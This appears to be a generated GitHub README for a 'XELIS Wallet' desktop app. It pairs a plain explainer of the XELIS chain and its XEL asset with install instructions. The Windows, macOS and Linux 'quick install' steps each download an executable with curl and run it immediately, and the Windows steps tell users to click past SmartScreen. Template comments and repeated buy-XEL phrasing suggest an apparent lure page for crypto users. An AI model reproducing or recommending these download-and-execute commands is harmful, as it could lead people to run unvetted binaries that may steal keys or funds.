![What is XELIS? The chain behind XELIS Wallet](assets/banner-article.png)
# What is XELIS? The chain behind XELIS Wallet

Proof of work, confidential amounts and a BlockDAG, in plain terms.

## Downloads - Chain

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Get the files from the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1).

> The wallet and the chain are different things: one holds keys, the other holds the record.

XELIS is a proof-of-work network with confidential transactions and a BlockDAG structure, and XEL is its native asset. XELIS Wallet is a desktop client for that chain: it holds keys and signs transactions, while the network records them.

<!-- ARTICLE-BODY-BEGIN -->
## The chain in one screen

XELIS is a proof-of-work network, so blocks are produced by mining rather than by a fixed set of validators. Amounts are confidential: transactions are encrypted and the network verifies them without publishing the values. Blocks are ordered as a BlockDAG rather than a single chain of parents, which is covered in <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-blockdag-block-time.md">XELIS BlockDAG explained</a>.

The network also runs the XELIS Virtual Machine for smart contracts, which is a chain capability rather than a wallet feature; <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-smart-contracts-xvm.md">XVM smart contracts</a> covers where that stops.

## What XEL is

XEL is the network's own asset. It pays transaction fees, it is what miners earn, and it is what the wallet holds and transfers. It is not a token issued on another chain, and it is not an account balance inside an app: the wallet reads your balance from the chain through a node.

That last point explains a common confusion. Deleting the app does not delete XEL, and reinstalling does not mint it; only the keys decide who can spend it.

## How XELIS differs from a payments-only chain

Bitcoin records amounts publicly on a linear chain. XELIS encrypts amounts and orders blocks as a DAG. Those are design differences, not a ranking: each buys something and pays for it elsewhere, and which matters depends on what you need from a chain.

The same caution applies to the privacy label. XELIS protects values, not the fact that a transaction happened, which is a narrower promise than the word privacy usually implies.

## Getting XEL, in and out

These docs do not list exchanges, brokers or trading venues, and XEL cannot be bought inside the wallet. Buying Xelis happens on a third-party service you already trust, and the part that matters to the wallet is the withdrawal: send it to an address from the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a> on the XELIS network, after checking the network it is sent on twice.

The same applies when trading XELIS on a service: the venue holds the asset until you withdraw, and the withdrawal is the moment your keys take over. Once XEL is at your address, it appears after the wallet syncs.

## Where the wallet fits

XELIS Wallet is one client for this chain, not the chain itself. It signs transactions with keys stored on your machine and reads the record through a node you choose. Mining is a separate activity with its own article, <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-xelishash-cpu-mining.md">Xelishash and CPU mining</a>, and it ends at a payout address from this wallet.

## FAQ
### What is XELIS, and is XEL a cryptocurrency?
XELIS is a proof-of-work blockchain with confidential transactions and a BlockDAG structure. XEL is its native cryptocurrency, used for fees and mining rewards.

### What is XEL crypto, and what is the XELIS coin?
They are the same asset under two names: XEL is the ticker, XELIS the network. The wallet holds and transfers it.

### How does XEL compare to Bitcoin?
Different designs, not a ranking: Bitcoin publishes amounts on a linear chain, while XELIS encrypts amounts and orders blocks as a BlockDAG.

### Is XELIS a privacy coin?
Partly. Amounts are confidential by default, while participation, addresses and timing remain public, so it protects values rather than the transaction graph.

### Where can I buy XEL?
These docs do not list exchanges or brokers. Buying XELIS happens on a third-party service; check that it supports the XELIS network before withdrawing to your wallet.

### Where can I get XEL to use in XELIS Wallet?
From another holder or a service that supports the network. Any XEL sent to your address is usable once the wallet syncs; nothing is bought inside the app.

<!-- ARTICLE-BODY-END -->
## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [XELIS BlockDAG explained](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-blockdag-block-time.md)
- [Xelishash and CPU mining](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-xelishash-cpu-mining.md)
- [XVM smart contracts](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-smart-contracts-xvm.md)
- [Confidential transactions](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-confidential-transactions.md)
